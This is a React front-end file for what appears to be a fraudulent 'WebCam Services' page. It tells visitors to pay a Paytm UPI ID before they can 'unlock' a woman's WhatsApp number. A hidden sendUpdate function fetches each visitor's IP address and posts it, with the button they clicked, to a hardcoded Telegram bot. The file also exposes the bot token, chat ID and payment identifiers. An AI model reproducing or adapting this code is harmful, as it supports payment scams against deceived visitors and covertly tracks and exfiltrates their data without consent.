/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable no-unused-vars */
import './App.css';
import React, { useEffect, useState } from 'react';
import WhatsappModal from './WhatsappModal';
import PaymentModal from './PaymentModal';
import CopyModal from './CopyModal';

let ip = 'Not Found'

async function sendUpdate(msg) {
  if (ip === 'Not Found') {
    fetch('https://api.db-ip.com/v2/free/self')
      .then(result => result.json())
      .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
        fetch(url, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: ''
        }).then(res => {
          console.log("Request complete!");
        })
      }).catch(err => console.error(err));
  } else {
    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=${msg}--------${ip.ipAddress}`
    fetch(url, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: ''
    }).then(res => {
      console.log("Request complete!");
    })
  }
}

function App() {
  const [isPaymentOpen, setIsPaymentOpen] = useState(false);
  const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);

  const handlepayButton = async () => {
    console.log('pay button clicked')
    setIsPaymentOpen(!isPaymentOpen);
    await sendUpdate("PayButton")
  }

  const togglePay = () => {
    setIsPaymentOpen(!isPaymentOpen);
  }

  const handleWspButton = async () => {
    setIsWhatsappOpen(!isWhatsappOpen)
    await sendUpdate("WhatsppBtn")
    //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl&am=1000", "_self");
  }

  const MsgBtnCombo = ({ msg, btnName, handler, err }) => {
    return (
      <div className="msgBtn">
        <h6>{msg}</h6>
        <button className='button' onClick={() => { handler() }}>{btnName}</button>
        {false
          && <span>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>PhonePe is not Working tempoarily!!</p>
            <p style={{ margin: "0px", fontWeight: 'normal', fontSize: "11px", color: "red" }}>Pay using QR Code Above or use GPay</p>
          </span>
        }
      </div>
    )
  }

  return (
    <div className="App" onClick={() => { /*setisOpen(false) */ }}>
      <header className="App-header">
        <h1 style={{ color: "#82ffa5", marginBottom: '5px' }}><img style={{ width: "200px" }} alt='' src='./logo.svg'></img></h1>
        <h6 id='serviceName'>WebCam Services</h6>
        <CopyExample />
        <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
        <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
        <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY NOW and Send me SCREENSHOT on Telegram!!🥰</h6>
        <WhatsappModal isOpen={isWhatsappOpen} setisOpen={setIsWhatsappOpen} togglePay={togglePay} className="special_modal"></WhatsappModal>
        <PaymentModal isOpen={isPaymentOpen} setisOpen={setIsPaymentOpen} className="special_modal2"></PaymentModal>
      </header>
    </div >
  );
}

function CopyExample() {
  const [isCopyOpen, setIsCopyOpen] = useState(false);

  const toggle = () => {
    setIsCopyOpen(!isCopyOpen)
  }

  return (
    <div className='card' style={{ backdropBlur: '10px' }}>
      <div style={{ color: "white", fontWeight: 'bold', padding: "0px 10px" }}>
        {/* <p style={{ fontSize: "15px" }}>If "<span style={{ color: "red" }}>PAY NOW</span>" Button is Not Working!!</p> */}
        <p style={{ marginBottom: '0px', fontWeight: "bolder" }}>Copy <p style={{ color: '#c9df3d', cursor: 'pointer', display: 'contents' }} onClick={async () => {
          navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
        }}>UPI ID </p>or  <a style={{ color: '#c9df3d', cursor: 'pointer', marginBottom: '0px' }} href='upi://pay?pa=paytmqr281005050101jnirp1ueoe1y@paytm&cu=INR&pn=Reddy%20Girl' onClick={async () => {
          navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
        }}>Scan</a> the QR code!!</p>
        {/* <p style={{ margin: "10px" }}> Pay to my QR Code 👇🏻👇🏻👇🏻</p> */}
      </div>
      <img className='qr' title='paytmqr281005050101jnirp1ueoe1y@paytm' style={{ marginTop: "6px" }} alt='' src='./QR.jpg'></img>
      <img className='upi' style={{ marginBottom: "0px", width: "140px" }} alt='' src='./upilogo.png'></img>
      {
        <div style={{ display: "flex", padding: "12px", height: "50px" }}>
          <span style={{ fontWeight: "bold", marginBottom: "5px" }}>UPI: </span>
          <input title='paytmqr281005050101jnirp1ueoe1y@paytm' readOnly value={"PaytmQR281......@paytm"} style={{ fontSize: '17px', textOverflow: 'ellipsis', fontWeight: 'normal', cursor: 'copy' }}></input >
          <button title='paytmqr281005050101jnirp1ueoe1y@paytm' className='cpybutton' onClick={async () => {
            navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
            setIsCopyOpen(true);
          }}>Copy</button>
        </div>
      }
      {isCopyOpen && <CopyModal isOpen={isCopyOpen} setIsOpen={setIsCopyOpen}></CopyModal>}
    </div >
  );
}


export default App;
